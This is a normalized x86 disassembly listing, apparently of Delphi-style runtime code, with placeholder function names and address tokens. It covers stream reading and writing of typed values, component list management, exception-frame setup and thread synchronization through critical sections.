call sub_403f6c
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41ec30
cmp [ ebp - 0x8 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_41ec30
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41d3d0
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_40405c
mov eax esi
call j_sub_404438#2
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41d3d0
pop edx
pop esi
pop ebx
retn
sub_41ec6c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41ed19
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41d3ac
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_41ed28
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4041f4
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ed20
lea eax [ ebp - 0x8 ]
call sub_404678
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41ee0c
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41d3d0
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4045b8
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41d3d0
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41d3d0
jmp r-xdata
jmp r-xdata
call sub_41cea8
sub_41ed28
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41edff
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41d3ac
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41ec6c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4047c4
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ee06
lea eax [ ebp - 0xc ]
call sub_403f6c
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41ee0c
sub al 0x12
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41d3d0
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4048c0
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_41d3d0
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41d3d0
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4045b8
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41d3d0
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_405d6c
jmp r-xdata
jmp r-xdata
call sub_41cea8
sub_41ee20
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41ee5c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41ec30
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ee63
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_41ee68
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41d068
test al al
je r-xdata
mov eax [ ebx ]
call sub_41ef1c
mov eax [ ebx ]
call sub_41dfd4
pop ebx
pop ebp
retn
sub_41ee90
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41d3d0
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41f314
pop ebx
pop ecx
pop ebp
retn
sub_41eec0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41d068
test al al
je r-xdata
mov eax [ ebx ]
call sub_41d3ac
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_41dfd4
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_41f314
jmp r-xdata
mov eax [ ebx ]
call sub_41ef1c
mov eax [ ebx ]
call sub_41d068
test al al
je r-xdata
mov eax [ ebx ]
call sub_41f0b8
mov eax [ ebx ]
call sub_41dfd4
sub_41ef1c
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f0ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41ee0c
and eax 0x7f
cmp eax 0x14
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f0b2
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
jmp [ eax * 4 + jump_table_41ef53 ]
push ebp
call sub_41ee68
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_41f314
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_41f314
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41f314
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_41f314
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41ec30
jmp r-xdata
push ebp
mov eax 0x1
call sub_41ee90
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ee20
jmp r-xdata
push ebp
mov eax 0x1
call sub_41ee90
pop ecx
jmp r-xdata
push ebp
call sub_41eec0
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41f314
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41f314
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41f314
jmp r-xdata
push ebp
mov eax 0x2
call sub_41ee90
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41f314
jmp r-xdata
push ebp
mov eax 0x1
call sub_41ee90
pop ecx
sub_41f0b8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41f0f5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41ec30
mov eax ebx
call sub_41ef1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f0fc
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_41f100
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_41f198
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_41d068
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41ec30
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_41ec30
jmp r-xdata
mov eax ebx
call sub_41f0b8
mov eax ebx
call sub_41dfd4
jmp r-xdata
mov eax ebx
call sub_41d068
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_41f100
mov eax ebx
call sub_41dfd4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f19f
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f90
retn
sub_41f1a8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41f24d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_404004
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_420044
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f254
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9bc
call sub_4039a8
sub_41f278
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x44 ]
call [ edi + 0x40 ]
sub_41f2a0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_41d300
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_41983c
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_403448
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_41d300
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_41f314
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_41d3d0
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_41d3d0
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_41f35c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41f505
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_41cf34
xor eax eax
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f4e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41d3d0
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_41be60
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_41d3d0
push 0x400
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c7f0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41f4bb
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41ec6c
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_41d3d0
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_41be60
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41d3d0
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4158b8
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
call sub_4039a8
lea eax [ ebp - 0x1c ]
call sub_40599c
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40d3e0
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f4c2
mov eax [ ebp - 0xc ]
call sub_40321c
retn
sub_41f524
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f71e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40f174
mov eax [ ebp - 0x4 ]
call sub_41d3ac
and eax 0x7f
cmp eax 0x14
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
call sub_4039a8
jmp [ eax * 4 + jump_table_41f566 ]
mov eax [ ebp - 0x4 ]
call sub_41ee0c
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41df1c
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_41357c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41df1c
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_41357c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41df1c
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_41357c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41dd00
mov eax ebx
call sub_413774
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41dd44
mov eax ebx
call sub_413774
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41dd88
mov eax ebx
call sub_41379c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ddd8
mov eax ebx
call sub_413788
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41ec6c
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4137b0
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41ed28
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_41382c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ee0c
cmp al 0x9
sete dl
mov eax ebx
call sub_41374c
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_41f35c
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_40f49c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41df88
push edx
push eax
mov eax ebx
call sub_413678
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f725
lea eax [ ebp - 0x1c ]
call sub_40f188
lea eax [ ebp - 0xc ]
call sub_404678
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
mov eax ebx
call sub_4159a0
jmp r-xdata
sub_41f72c
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_41f778
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_41f7a4
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_41f914
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41f72c
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_41f914
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41f72c
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_41f914
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_41f72c
jmp r-xdata
pop edx
pop ebx
retn
sub_41f828
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_404378
je r-xdata
mov eax esi
call sub_40422c
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
mov eax edi
call sub_40422c
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_41f914
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41f72c
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_41f72c
jmp r-xdata
mov dl 0xc
mov eax ebx
call sub_41f914
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41f72c
mov dl 0x6
mov eax ebx
call sub_41f914
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41f72c
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_41f72c
sub_41f8c0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41f905
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405e10
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_41f828
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f90c
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_41f99c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9bc
call sub_4039a8
call sub_41f974
mov eax ebx
call sub_41f980
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41fb2a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41fb0b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fb12
mov eax [ ebp - 0xc ]
call sub_40321c
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41a19c
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41a08c
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_41fad5
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41faa6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_41fb3c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov al [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_41fcf4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_41fb88
push ebx
push esi
push ecx
call sub_4035a8
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_41fddc
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_41fd84
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebx
call sub_41a714
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_41fd4c
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_403590
lea eax [ ebx + 0x14 ]
call sub_40d3ac
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_41a19c
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_41fc0c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_41a1f8
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_41a040
mov edx ebx
mov eax esi
call sub_41fc0c
sub_41fca0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_41a040
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebx + 0x10 ] eax
sub_41fccc
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_41a2e0
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_40321c
xor eax eax
mov [ ebx + 0x10 ] eax
sub_41fcf4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403418
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_41fca0
mov dl 0x1
mov eax ebx
call sub_420214
test [ edi + 0x1c ] 0x10
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_4201c4
sub_41fd4c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_420214
mov edx ebx
mov eax esi
call sub_41fccc
pop edi
pop esi
pop ebx
retn
sub_41fd84
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_41a284
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_41fd4c
jmp r-xdata
mov ax [ r-xdata ]
and ax [ esi + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_41fccc
sub_41fddc
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_41a19c
call sub_41fddc
inc edi
dec esi
jne r-xdata
sub_41fe18
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_41a2e0
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_40321c
xor eax eax
mov [ ebx + 0x14 ] eax
sub_41fe3c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41fe18
mov edx ebx
mov eax esi
call sub_41fe18
pop esi
pop ebx
retn
sub_41fe58
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_41fe3c
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_41a19c
mov cl [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x8 ]
cmp ebx eax
jl r-xdata
test ebx ebx
jge r-xdata
mov ebx eax
dec ebx
sub_41feb4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_41fc60
push ebx
push sub_41fc88
mov ax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_41fc74
push ebx
push sub_41fc94
mov ax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_41ffac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40800c
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_420044
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9bc
call sub_4039a8
sub_420044
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
